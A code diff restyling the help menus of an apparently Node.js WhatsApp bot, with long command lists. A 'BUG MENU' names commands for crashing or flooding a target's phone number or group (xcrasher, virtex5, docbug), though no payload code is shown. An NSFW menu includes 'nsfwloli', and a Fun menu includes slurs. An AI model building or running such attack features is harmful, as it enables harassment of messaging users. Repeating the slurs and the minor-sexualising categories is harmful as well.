+╠${prefix}multicolor
+╠${prefix}snow
+╠${prefix}harrypot
+╠${prefix}harrypotter
+╠${prefix}brokenglass
+╠${prefix}waterpipe
+╠${prefix}spooky
+╠${prefix}circuit
+╠${prefix}metallic
+╠${prefix}demon
+╠${prefix}sparklechristmas
+╠${prefix}christmas
+╠${prefix}3dchristmas
+╠${prefix}3dbox
+╠${prefix}waterdrop
+╠${prefix}lion2
+╠${prefix}papercut
+╠${prefix}transformer
+╠${prefix}neondevil
+╠${prefix}3davengers
+╠${prefix}3dstone
+╠${prefix}3dstone2
+╠${prefix}summertime
+╠${prefix}thunder
+╠${prefix}window
+╠${prefix}graffiti
+╠${prefix}graffitibike
+╠${prefix}pornhub
+╠${prefix}glitch
+╠${prefix}blackpinkart
+╠${prefix}glitch2
+╠${prefix}glitch3
+╠${prefix}3dspace
+╠${prefix}lion
+╠${prefix}3dneon
+╠${prefix}greenneon
+╠${prefix}bokeh
+╠${prefix}holographic
+╠${prefix}bear
+╠${prefix}wolf
+╠${prefix}joker
+╠${prefix}dropwater
+╠${prefix}dropwater2
+╠${prefix}thewall
+╠${prefix}neonlight
+╠${prefix}natural
+╠${prefix}carbon
+╠${prefix}pencil
+╠${prefix}blackpink2
+╠${prefix}neon
+╠${prefix}neonlight2
+╠${prefix}toxic
+╠${prefix}strawberry
+╠${prefix}discovery
+╠${prefix}1917
+╠ ${prefix}sci_fi
+╠ ${prefix}ancient
+╠ ${prefix}fabric
+╠ ${prefix}hoorror
+╠ ${prefix}whitebear
+╠ ${prefix}juice
+╠ ${prefix}batman
+╠ ${prefix}multicolor
+╠ ${prefix}wonderful
+╠ ${prefix}sketch
+╠ ${prefix}marvel
+╠ ${prefix}foggy
+╠ ${prefix}writing
+╠ ${prefix}halloweenfire
+╠ ${prefix}halloween
+╠ ${prefix}watercolor
+╠ ${prefix}classic
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8299,14 +8638,14 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ DOWNLOAD 	
-⬇${prefix}tiktok [url]
-⬇${prefix}tiktokaudio [url]
-⬇${prefix}instagram [url]
-⬇${prefix}spotify [url]
-⬇${prefix}mediafire [url]
-⬇${prefix}ytmp3 [url|quality]
-⬇${prefix}ytmp4 [url|quality]
-⬇${prefix}gitclone [repo link]
+╠${prefix}tiktok [url]
+╠${prefix}tiktokaudio [url]
+╠${prefix}instagram [url]
+╠${prefix}spotify [url]
+╠${prefix}mediafire [url]
+╠${prefix}ytmp3 [url|quality]
+╠${prefix}ytmp4 [url|quality]
+╠${prefix}gitclone [repo link]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8326,24 +8665,24 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ SEARCH 	
-🕵️‍♀️${prefix}play [query]
-🕵️‍♀️${prefix}song [query]
-🕵️‍♀️${prefix}yts [query]
-🕵️‍♀️${prefix}lyrics [query]
-🕵️‍♀️${prefix}gimage [query]
-🕵️‍♀️${prefix}google [query]
-🕵️‍♀️${prefix}anime [query]
-🕵️‍♀️${prefix}pinterest [query]
-🕵️‍♀️${prefix}image [query]
-🕵️‍♀️${prefix}wallpaper [query]
-🕵️‍♀️${prefix}searchno [number]
-🕵️‍♀️${prefix}horoscope [query]
-🕵️‍♀️${prefix}imdb [movie name]
-🕵️‍♀️${prefix}weather [loc name]
-🕵️‍♀️${prefix}genshin [char name]
-🕵️‍♀️${prefix}wikimedia [query]
-🕵️‍♀️${prefix}ytsearch [query]
-🕵️‍♀️${prefix}ringtone [query]
+╠${prefix}play [query]
+╠${prefix}song [query]
+╠${prefix}yts [query]
+╠${prefix}lyrics [query]
+╠${prefix}google [query]
+╠${prefix}google [query]
+╠${prefix}anime [query]
+╠${prefix}pinterest [query]
+╠${prefix}image [query]
+╠${prefix}wallpaper [query]
+╠${prefix}searchno [number]
+╠${prefix}horoscope [query]
+╠${prefix}imdb [movie name]
+╠${prefix}weather [loc name]
+╠${prefix}genshin [char name]
+╠${prefix}wikimedia [query]
+╠${prefix}ytsearch [query]
+╠${prefix}ringtone [query]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8363,33 +8702,33 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ CONVERT 	
-⚓${prefix}toimage [reply stick]
-⚓${prefix}sticker [reply img|gif]
-⚓${prefix}take [reply img|gif|stik]
-⚓${prefix}smeme [reply img]
-⚓${prefix}emoji [emoji]
-⚓${prefix}tovideo [reply img]
-⚓${prefix}togif [reply stick]
-⚓${prefix}tovn [reply aud]
-⚓${prefix}tomp3 [reply vn]
-⚓${prefix}toaudio [reply vid]
-⚓${prefix}ebinary [reply txt]
-⚓${prefix}dbinary [reply txt]
-⚓${prefix}tinyurl [link]
-⚓${prefix}styletext [text]
-⚓${prefix}volume [reply aud]
-⚓${prefix}bass [reply aud]
-⚓${prefix}blown [reply aud]
-⚓${prefix}deep [reply aud]
-⚓${prefix}earrape [reply aud]
-⚓${prefix}fast [reply aud]
-⚓${prefix}fat [reply aud]
-⚓${prefix}nightcore [reply aud]
-⚓${prefix}reverse [reply aud]
-⚓${prefix}robot [reply aud]
-⚓${prefix}slow [reply aud]
-⚓${prefix}smooth [reply aud]
-⚓${prefix}squirrel [reply aud]
+╠ ${prefix}toimage [reply stick]
+╠ ${prefix}sticker [reply img|gif]
+╠ ${prefix}take [reply img|gif|stik]
+╠ ${prefix}smeme [reply img]
+╠ ${prefix}emoji [emoji]
+╠ ${prefix}tovideo [reply img]
+╠ ${prefix}togif [reply stick]
+╠ ${prefix}tovn [reply aud]
+╠ ${prefix}tomp3 [reply vn]
+╠ ${prefix}toaudio [reply vid]
+╠ ${prefix}ebinary [reply txt]
+╠ ${prefix}dbinary [reply txt]
+╠ ${prefix}tinyurl [link]
+╠ ${prefix}styletext [text]
+╠${prefix}volume [reply aud]
+╠${prefix}bass [reply aud]
+╠${prefix}blown [reply aud]
+╠${prefix}deep [reply aud]
+╠${prefix}earrape [reply aud]
+╠${prefix}fast [reply aud]
+╠${prefix}fat [reply aud]
+╠${prefix}nightcore [reply aud]
+╠${prefix}reverse [reply aud]
+╠${prefix}robot [reply aud]
+╠${prefix}slow [reply aud]
+╠${prefix}smooth [reply aud]
+╠${prefix}squirrel [reply aud]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8409,43 +8748,43 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ RANDOM IMG 	
-🔱${prefix}coffee
-🔱 ${prefix}woof
-🔱 ${prefix}meow
-🔱 ${prefix}lizard
-🔱 ${prefix}chinese
-🔱 ${prefix}japanese
-🔱 ${prefix}korean
-🔱 ${prefix}indo
-🔱 ${prefix}thai
-🔱 ${prefix}vietnamese
-🔱 ${prefix}malay
-🔱 ${prefix}hijab
-🔱 ${prefix}randomgirl
-🔱 ${prefix}randomboy
-🔱 ${prefix}aesthetic
-🔱 ${prefix}antiwork
-🔱 ${prefix}cosplay
-🔱 ${prefix}car
-🔱 ${prefix}bike
-🔱 ${prefix}doggo
-🔱 ${prefix}cat
-🔱 ${prefix}notnot
-🔱 ${prefix}kayes
-🔱 ${prefix}justina
-🔱 ${prefix}ryujin
-🔱 ${prefix}boneka
-🔱 ${prefix}rose
-🔱 ${prefix}kpop
-🔱 ${prefix}blackpink
-🔱 ${prefix}ulzzangboy
-🔱 ${prefix}ulzzanggirl
-🔱 ${prefix}pubg
-🔱 ${prefix}hacking
-🔱 ${prefix}profilepicture
-🔱 ${prefix}couplepicture
-🔱 ${prefix}wallphone
-🔱 ${prefix}wallml
+╠${prefix}coffee
+╠${prefix}woof
+╠${prefix}meow
+╠${prefix}lizard
+╠${prefix}chinese
+╠${prefix}japanese
+╠${prefix}korean
+╠${prefix}indo
+╠${prefix}thai
+╠${prefix}vietnamese
+╠${prefix}malay
+╠${prefix}hijab
+╠${prefix}randomgirl
+╠${prefix}randomboy
+╠${prefix}aesthetic
+╠${prefix}antiwork
+╠${prefix}cosplay
+╠${prefix}car
+╠${prefix}bike
+╠${prefix}doggo
+╠${prefix}cat
+╠${prefix}notnot
+╠${prefix}kayes
+╠${prefix}justina
+╠${prefix}ryujin
+╠${prefix}boneka
+╠${prefix}rose
+╠${prefix}kpop
+╠${prefix}blackpink
+╠${prefix}ulzzangboy
+╠${prefix}ulzzanggirl
+╠${prefix}pubg
+╠${prefix}hacking
+╠${prefix}profilepicture
+╠${prefix}couplepicture
+╠${prefix}wallphone
+╠${prefix}wallml
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8465,14 +8804,14 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ RANDOM VIDEO
-◀ ${prefix}tiktokgirl	
-◀ ${prefix}tiktoknukhty
-◀ ${prefix}tiktokpanrika
-◀ ${prefix}tiktokkayes
-◀ ${prefix}tiktoknotnot
-◀ ${prefix}tiktokghea
-◀ ${prefix}tiktoksantuy
-◀ ${prefix}tiktokbocil
+╠${prefix}tiktokgirl	
+╠${prefix}tiktoknukhty
+╠${prefix}tiktokpanrika
+╠${prefix}tiktokkayes
+╠${prefix}tiktoknotnot
+╠${prefix}tiktokghea
+╠${prefix}tiktoksantuy
+╠${prefix}tiktokbocil
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8492,18 +8831,18 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ EMOTE 	
-🧙‍${prefix}instagramemoji
-🧙‍${prefix}facebookemoji
-🧙‍${prefix}iphoneemoji
-🧙‍${prefix}samsungemoji
-🧙‍${prefix}joyemoji
-🧙‍${prefix}skypeemoji
-🧙‍${prefix}twitteremoji
-🧙‍${prefix}whatsappemoji
-🧙‍${prefix}microsoftemoji
-🧙‍${prefix}googleemoji
-🧙‍${prefix}pediaemoji
-🧙‍${prefix}microsoftemoji
+╠${prefix}instagramemoji
+╠${prefix}facebookemoji
+╠${prefix}iphoneemoji
+╠${prefix}samsungemoji
+╠${prefix}joyemoji
+╠${prefix}skypeemoji
+╠${prefix}twitteremoji
+╠${prefix}whatsappemoji
+╠${prefix}microsoftemoji
+╠${prefix}googleemoji
+╠${prefix}pediaemoji
+╠${prefix}microsoftemoji
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8523,7 +8862,7 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═════✪ IMG EFFECT 	
-╠🎗${prefix}removebg [reply img]
+╠${prefix}removebg [reply img]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8543,13 +8882,57 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ ANIME 	
-🕹 ${prefix}animeneko
-🕹 ${prefix}waifu
-🕹 ${prefix}animewaifu
-🕹 ${prefix}animeawoo
-🕹 ${prefix}shinobu
-🕹 ${prefix}foxgirl
-🕹 ${prefix}animemegumin
+╠${prefix}animeneko
+╠${prefix}waifu
+╠${prefix}shinobu
+╠${prefix}animeawoo
+╠${prefix}animewaifu
+╠${prefix}foxgirl
+╠${prefix}animenom
+╠${prefix}goose
+╠${prefix}8ball
+╠${prefix}avatar
+╠${prefix}tickle
+╠${prefix}gecg
+╠${prefix}feed
+╠${prefix}husbu
+╠${prefix}neko2
+╠${prefix}randomanime
+╠${prefix}shota
+╠${prefix}waifu2
+╠${prefix}animeslap
+╠${prefix}animepat
+╠${prefix}animeneko
+╠${prefix}animekiss
+╠${prefix}animewlp
+╠${prefix}animecuddle
+╠${prefix}animecry
+╠${prefix}animekill
+╠${prefix}animelick
+╠${prefix}animebite
+╠${prefix}animeyeet
+╠${prefix}animebully
+╠${prefix}animebonk
+╠${prefix}animewink
+╠${prefix}animepoke
+╠${prefix}animesmile
+╠${prefix}animewave
+╠${prefix}animeawoo
+╠${prefix}animeblush
+╠${prefix}animesmug
+╠${prefix}animeglomp
+╠${prefix}animehappy
+╠${prefix}animedance
+╠${prefix}animecringe
+╠${prefix}animehighfive
+╠${prefix}animehandhold
+╠${prefix}animemegumin
+╠${prefix}animemegumin
+╠${prefix}animesmug
+╠${prefix}loli-waifu
+╠${prefix}couplepp
+╠${prefix}animewall [query]
+╠${prefix}animewall2 [query]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8569,17 +8952,17 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ STICKER 	
-🛬 ${prefix}patrick
-🛬 ${prefix}emoji
-🛬 ${prefix}emojimix
-🛬 ${prefix}doge
-🛬 ${prefix}lovesticker
-🛬 ${prefix}animestick
-🛬 ${prefix}spongebob
-🛬 ${prefix}gojosatoru
-🛬 ${prefix}nicholas
-🛬 ${prefix}cartoon
-🛬 ${prefix}stickman
+╠ ${prefix}patrick
+╠ ${prefix}emoji
+╠ ${prefix}emojimix
+╠ ${prefix}doge
+╠ ${prefix}lovesticker
+╠ ${prefix}animestick
+╠ ${prefix}spongebob
+╠ ${prefix}gojosatoru
+╠ ${prefix}nicholas
+╠ ${prefix}cartoon
+╠ ${prefix}stickman
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8599,18 +8982,35 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ ANIME STICKER 	
-👨‍🌾${prefix}loli
-👨‍🌾${prefix}bully
-👨‍🌾${prefix}cuddle
-👨‍🌾${prefix}cry
-👨‍🌾${prefix}hug
-👨‍🌾${prefix}awoo
-👨‍🌾${prefix}kiss
-👨‍🌾${prefix}lick
-👨‍🌾${prefix}dance
-👨‍🌾${prefix}cringe
-👨‍🌾${prefix}neko
-👨‍🌾${prefix}gura
+╠${prefix}loli
+╠${prefix}bully
+╠${prefix}cuddle
+╠${prefix}cry
+╠${prefix}hug
+╠${prefix}awoo
+╠${prefix}kiss
+╠${prefix}lick
+╠${prefix}pat
+╠${prefix}smug
+╠${prefix}bonk
+╠${prefix}yeet
+╠${prefix}blush
+╠${prefix}smile
+╠${prefix}wave
+╠${prefix}highfive
+╠${prefix}handhold
+╠${prefix}nom
+╠${prefix}glomp
+╠${prefix}bite
+╠${prefix}slap
+╠${prefix}kill
+╠${prefix}happy
+╠${prefix}wink
+╠${prefix}poke
+╠${prefix}dance
+╠${prefix}cringe
+╠${prefix}neko
+╠${prefix}gura
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8630,24 +9030,41 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ NSFW 	
-⚜${prefix}gifhentai
-⚜${prefix}gifblowjob
-⚜${prefix}hentaivideo
-⚜${prefix}hneko
-⚜${prefix}nwaifu
-⚜${prefix}animespank
-⚜${prefix}trap
-⚜${prefix}gasm
-⚜${prefix}ahegao
-⚜${prefix}ass
-⚜${prefix}bdsm
-⚜${prefix}blowjob
-⚜${prefix}cuckold
-⚜${prefix}cum
-⚜${prefix}milf
-⚜${prefix}eba
-⚜${prefix}ero
-⚜${prefix}femdom
+╠${prefix}gifhentai
+╠${prefix}gifblowjob
+╠${prefix}hentaivideo
+╠${prefix}hneko
+╠${prefix}nwaifu
+╠${prefix}animespank
+╠${prefix}trap
+╠${prefix}gasm
+╠${prefix}ahegao
+╠${prefix}ass
+╠${prefix}bdsm
+╠${prefix}blowjob
+╠${prefix}cuckold
+╠${prefix}cum
+╠${prefix}milf
+╠${prefix}eba
+╠${prefix}ero
+╠${prefix}femdom
+╠${prefix}foot
+╠${prefix}gangbang
+╠${prefix}glasses
+╠${prefix}hentai
+╠${prefix}jahy
+╠${prefix}manga
+╠${prefix}masturbation
+╠${prefix}neko-hentai
+╠${prefix}neko-hentai2
+╠${prefix}nsfwloli
+╠${prefix}orgy
+╠${prefix}panties
+╠${prefix}pussy
+╠${prefix}tentacles
+╠${prefix}thights
+╠${prefix}yuri
+╠${prefix}zettai
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8667,15 +9084,81 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ Fun 
-👼 ${prefix}say [text]
-👼 ${prefix}define [text]
-👼 ${prefix}how [text
-👼 ${prefix}when [text]
-👼 ${prefix}where [text]
-👼 ${prefix}is [text]
-👼 ${prefix}what [text]
-👼 ${prefix}playgirl
-👼 ${prefix}quotes
+╠ ${prefix}say [text]	
+╠ ${prefix}define [text]
+╠ ${prefix}how [text]
+╠ ${prefix}when [text]
+╠ ${prefix}where [text]
+╠ ${prefix}is [text]
+╠ ${prefix}what [text]
+╠ ${prefix}can [text]
+╠ ${prefix}rate [text]
+╠ ${prefix}coolcheck [tag]
+╠ ${prefix}stupidcheck [tag]
+╠ ${prefix}waifucheck [tag]
+╠ ${prefix}evilcheck [tag]
+╠ ${prefix}dogcheck [tag]
+╠ ${prefix}hotcheck [tag]
+╠ ${prefix}smartcheck [tag]
+╠ ${prefix}uncleancheck [tag]
+╠ ${prefix}greatcheck [tag]
+╠ ${prefix}beautifulcheck [tag]
+╠ ${prefix}awesomecheck [tag]
+╠ ${prefix}prettycheck [tag]
+╠ ${prefix}lesbiancheck [tag]
+╠ ${prefix}gaycheck [tag]
+╠ ${prefix}cutecheck [tag]
+╠ ${prefix}uglycheck [tag]
+╠ ${prefix}hornycheck [tag]
+╠ ${prefix}charactercheck [tag]
+╠ ${prefix}lovelycheck [tag]
+╠ ${prefix}couple
+╠ ${prefix}soulmate
+╠ ${prefix}hot
+╠ ${prefix}sexy
+╠ ${prefix}kind
+╠ ${prefix}idiot
+╠ ${prefix}handsome
+╠ ${prefix}beautiful
+╠ ${prefix}cute
+╠ ${prefix}pretty
+╠ ${prefix}lesbian
+╠ ${prefix}noob
+╠ ${prefix}bastard
+╠ ${prefix}foolish
+╠ ${prefix}nerd
+╠ ${prefix}asshole
+╠ ${prefix}gay
+╠ ${prefix}smart
+╠ ${prefix}stubble
+╠ ${prefix}dog
+╠ ${prefix}horny
+╠ ${prefix}cunt
+╠ ${prefix}wibu
+╠ ${prefix}noobra
+╠ ${prefix}nibba
+╠ ${prefix}nibbi
+╠ ${prefix}comrade
+╠ ${prefix}mumu
+╠ ${prefix}rascal
+╠ ${prefix}scumbag
+╠ ${prefix}nuts
+╠ ${prefix}fagot
+╠ ${prefix}scoundrel
+╠ ${prefix}ditch
+╠ ${prefix}dope
+╠ ${prefix}gucci
+╠ ${prefix}lit
+╠ ${prefix}dumbass
+╠ ${prefix}crackhead
+╠ ${prefix}mf
+╠ ${prefix}motherfucker
+╠ ${prefix}sucker
+╠ ${prefix}fuckboy
+╠ ${prefix}playboy
+╠ ${prefix}fuckgirl
+╠ ${prefix}playgirl
+╠ ${prefix}quotes
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8695,15 +9178,167 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ Sound 	
-🔰 ${prefix}sound1
-🔰  ${prefix}sound2
-🔰  ${prefix}sound3
-🔰  ${prefix}sound4
-🔰  ${prefix}sound5
-🔰  ${prefix}sound6
-🔰  ${prefix}sound7
-🔰  ${prefix}sound8
-🔰  ${prefix}sound9
+╠ ${prefix}sound1
+╠ ${prefix}sound2
+╠ ${prefix}sound3
+╠ ${prefix}sound4
+╠ ${prefix}sound5
+╠ ${prefix}sound6
+╠ ${prefix}sound7
+╠ ${prefix}sound8
+╠ ${prefix}sound9
+╠ ${prefix}sound10
+╠ ${prefix}sound11
+╠ ${prefix}sound12
+╠ ${prefix}sound13
+╠ ${prefix}sound14
+╠ ${prefix}sound15
+╠ ${prefix}sound16
+╠ ${prefix}sound17
+╠ ${prefix}sound18
+╠ ${prefix}sound19
+╠ ${prefix}sound20
+╠ ${prefix}sound21
+╠ ${prefix}sound22
+╠ ${prefix}sound23
+╠ ${prefix}sound24
+╠ ${prefix}sound25
+╠ ${prefix}sound26
+╠ ${prefix}sound27
+╠ ${prefix}sound28
+╠ ${prefix}sound29
+╠ ${prefix}sound30
+╠ ${prefix}sound31
+╠ ${prefix}sound32
+╠ ${prefix}sound33
+╠ ${prefix}sound34
+╠ ${prefix}sound35
+╠ ${prefix}sound36
+╠ ${prefix}sound37
+╠ ${prefix}sound38
+╠ ${prefix}sound39
+╠ ${prefix}sound40
+╠ ${prefix}sound41
+╠ ${prefix}sound42
+╠ ${prefix}sound43
+╠ ${prefix}sound44
+╠ ${prefix}sound45
+╠ ${prefix}sound46
+╠ ${prefix}sound47
+╠ ${prefix}sound48
+╠ ${prefix}sound49
+╠ ${prefix}sound50
+╠ ${prefix}sound51
+╠ ${prefix}sound52
+╠ ${prefix}sound53
+╠ ${prefix}sound54
+╠ ${prefix}sound55
+╠ ${prefix}sound56
+╠ ${prefix}sound57
+╠ ${prefix}sound58
+╠ ${prefix}sound59
+╠ ${prefix}sound60
+╠ ${prefix}sound61
+╠ ${prefix}sound62
+╠ ${prefix}sound63
+╠ ${prefix}sound64
+╠ ${prefix}sound65
+╠ ${prefix}sound66
+╠ ${prefix}sound67
+╠ ${prefix}sound68
+╠ ${prefix}sound69
+╠ ${prefix}sound70
+╠ ${prefix}sound71
+╠ ${prefix}sound72
+╠ ${prefix}sound73
+╠ ${prefix}sound74
+╠ ${prefix}sound75
+╠ ${prefix}sound76
+╠ ${prefix}sound77
+╠ ${prefix}sound78
+╠ ${prefix}sound79
+╠ ${prefix}sound80
+╠ ${prefix}sound81
+╠ ${prefix}sound82
+╠ ${prefix}sound83
+╠ ${prefix}sound84
+╠ ${prefix}sound85
+╠ ${prefix}sound86
+╠ ${prefix}sound87
+╠ ${prefix}sound88
+╠ ${prefix}sound89
+╠ ${prefix}sound90
+╠ ${prefix}sound91
+╠ ${prefix}sound92
+╠ ${prefix}sound93
+╠ ${prefix}sound94
+╠ ${prefix}sound95
+╠ ${prefix}sound96
+╠ ${prefix}sound97
+╠ ${prefix}sound98
+╠ ${prefix}sound99
+╠ ${prefix}sound100
+╠ ${prefix}sound101
+╠ ${prefix}sound102
+╠ ${prefix}sound103
+╠ ${prefix}sound104
+╠ ${prefix}sound105
+╠ ${prefix}sound106
+╠ ${prefix}sound107
+╠ ${prefix}sound108
+╠ ${prefix}sound109
+╠ ${prefix}sound110
+╠ ${prefix}sound111
+╠ ${prefix}sound112
+╠ ${prefix}sound113
+╠ ${prefix}sound114
+╠ ${prefix}sound115
+╠ ${prefix}sound116
+╠ ${prefix}sound117
+╠ ${prefix}sound118
+╠ ${prefix}sound119
+╠ ${prefix}sound120
+╠ ${prefix}sound121
+╠ ${prefix}sound122
+╠ ${prefix}sound123
+╠ ${prefix}sound124
+╠ ${prefix}sound125
+╠ ${prefix}sound126
+╠ ${prefix}sound127
+╠ ${prefix}sound128
+╠ ${prefix}sound129
+╠ ${prefix}sound130
+╠ ${prefix}sound131
+╠ ${prefix}sound132
+╠ ${prefix}sound133
+╠ ${prefix}sound134
+╠ ${prefix}sound135
+╠ ${prefix}sound136
+╠ ${prefix}sound137
+╠ ${prefix}sound138
+╠ ${prefix}sound139
+╠ ${prefix}sound140
+╠ ${prefix}sound141
+╠ ${prefix}sound142
+╠ ${prefix}sound143
+╠ ${prefix}sound144
+╠ ${prefix}sound145
+╠ ${prefix}sound146
+╠ ${prefix}sound147
+╠ ${prefix}sound148
+╠ ${prefix}sound149
+╠ ${prefix}sound150
+╠ ${prefix}sound151
+╠ ${prefix}sound152
+╠ ${prefix}sound153
+╠ ${prefix}sound154
+╠ ${prefix}sound155
+╠ ${prefix}sound156
+╠ ${prefix}sound157
+╠ ${prefix}sound158
+╠ ${prefix}sound159
+╠ ${prefix}sound160
+╠ ${prefix}sound161
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8723,13 +9358,13 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ GAME 	
-👷‍♂️  ${prefix}truth
-👷‍♂️  ${prefix}dare
-👷‍♂️  ${prefix}tictactoe
-👷‍♂️  ${prefix}delttt
-👷‍♂️  ${prefix}guess [option]
-👷‍♂️  ${prefix}math [mode]
-👷‍♂️  ${prefix}suitpvp [tag]
+╠ ${prefix}truth
+╠ ${prefix}dare
+╠ ${prefix}tictactoe
+╠ ${prefix}delttt
+╠ ${prefix}guess [option]
+╠ ${prefix}math [mode]
+╠ ${prefix}suitpvp [tag]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8749,10 +9384,10 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══✪ ANONYMOUS 	
-🤹‍♂️ ${prefix}anonymous
-🤹‍♂️ ${prefix}start
-🤹‍♂️ ${prefix}next
-🤹‍♂️ ${prefix}leave
+╠${prefix}anonymous
+╠${prefix}start
+╠${prefix}next
+╠${prefix}leave
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8772,14 +9407,14 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══✪ DATABASE 	
-🧭 ${prefix}setcmd
-🧭 ${prefix}listcmd
-🧭 ${prefix}delcmd
-🧭 ${prefix}lockcmd
-🧭 ${prefix}addmsg
-🧭 ${prefix}listmsg
-🧭 ${prefix}getmsg
-🧭 ${prefix}delmsg
+╠ ${prefix}setcmd
+╠ ${prefix}listcmd
+╠ ${prefix}delcmd
+╠ ${prefix}lockcmd
+╠ ${prefix}addmsg
+╠ ${prefix}listmsg
+╠ ${prefix}getmsg
+╠ ${prefix}delmsg
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8799,14 +9434,26 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪ OTHER 	
-💦 ${prefix}alive
-💦 ${prefix}script
-💦 ${prefix}ping
-💦 ${prefix}owner
-💦 ${prefix}menu
-💦 ${prefix}delete
-💦 ${prefix}request
-💦 ${prefix}report [bug]
+╠ ${prefix}afk
+╠ ${prefix}id
+╠ ${prefix}toqr [link]
+╠ ${prefix}repeat
+╠ ${prefix}readmore [text]
+╠ ${prefix}toviewonce
+╠ ${prefix}fliptext [text]] 
+╠ ${prefix}alive
+╠ ${prefix}script
+╠ ${prefix}ping
+╠ ${prefix}owner
+╠ ${prefix}menu
+╠ ${prefix}delete
+╠ ${prefix}chatinfo
+╠ ${prefix}quoted
+╠ ${prefix}listpc
+╠ ${prefix}listgc
+╠ ${prefix}donate
+╠ ${prefix}request
+╠ ${prefix}report [bug]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8826,20 +9473,36 @@ const buttons = [
 const buttonMessage = {
     image: unicorn,
     caption: `╔═══════✪「 BUG MENU 」	
-════☾pc attack☽☠
-☠${prefix}pcbut [number]
-☠${prefix}pcvn [number]
-☠${prefix}pcstick [number]
-☠${prefix}pcfast [number]
-════☾gc attack☽☠
-☠${prefix}gcslow
-☠${prefix}gcfast
-☠${prefix}gcbunny
-☠${prefix}tagallbug
-════☾pc & gc attack☽☠
-☠${prefix}vnbug [amount]
-☠${prefix}docbug [amount]
-☠${prefix}pcgcslow [number]
+╠════☾pc attack☽
+╠${prefix}pcbut [number]
+╠${prefix}pcvn [number]
+╠${prefix}pcstick [number]
+╠${prefix}pcfast [number]
+╠${prefix}pcslow [number]
+╠${prefix}pcbunny [number]
+╠${prefix}xcrasher [amount]
+╠${prefix}pccontact [amount]
+╠${prefix}virtex5 [amount]
+╠${prefix}flower [amount]
+╠${prefix}pollbug [amount]
+╠${prefix}catalogbug [amount]
+╠${prefix}trollybug [amount]
+╠${prefix}trollybug2 [amount]
+╠════☾gc attack☽
+╠${prefix}gcslow
+╠${prefix}gcfast
+╠${prefix}gcbunny
+╠${prefix}tagallbug
+╠════☾pc & gc attack☽
+╠${prefix}vnbug [amount]
+╠${prefix}docbug [amount]
+╠${prefix}pcgcslow [number]
+╠${prefix}pcgcfast [number]
+╠${prefix}pcgcbunny [number]
+╠${prefix}textshot
+╠${prefix}docfuck [amount]
+╠${prefix}docsoft [amount]
+╠${prefix}docsoft2 [amount]
 ╚═════════════✪`,
     footer: `${botname}`,
     buttons: buttons,
@@ -8926,4 +9589,3 @@ fs.watchFile(file, () => {
 	delete require.cache[file]
 	require(file)
 })
-
